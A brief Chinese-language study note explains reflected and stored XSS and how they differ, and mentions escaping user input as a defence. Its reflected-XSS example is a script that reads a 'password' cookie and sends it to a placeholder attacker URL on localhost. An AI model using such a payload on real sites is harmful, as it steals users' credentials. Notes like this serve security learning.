# 反射型xss漏洞
- 攻击者往目标网站的url中添加可执行的代码，诱使目标网站的用户点击，目标网站将攻击参数当成普通字符串添加到了网页中导致攻击被执行。
```js
<script>
var mess = document.cookie.match(new%20RegExp("password=([^;]*)"))[0]; 

window.location="http://localhost:8080/attacter/index.jsp?info="%2Bmess
</script>
```

# 保存型xss漏洞
它是将攻击脚本保存到被攻击的网站后台内，所有浏览该网页的用户都要执行这段攻击脚本。
- 攻击方法：网站允许提交评论，用户名等信息，但攻击者向网站提交可执行的html代码
- 转译用户提交的内容。

#区别
反射型一次只能攻击一个用户
保存型，可以代码被网站后台保存，所有访问用户都会被攻击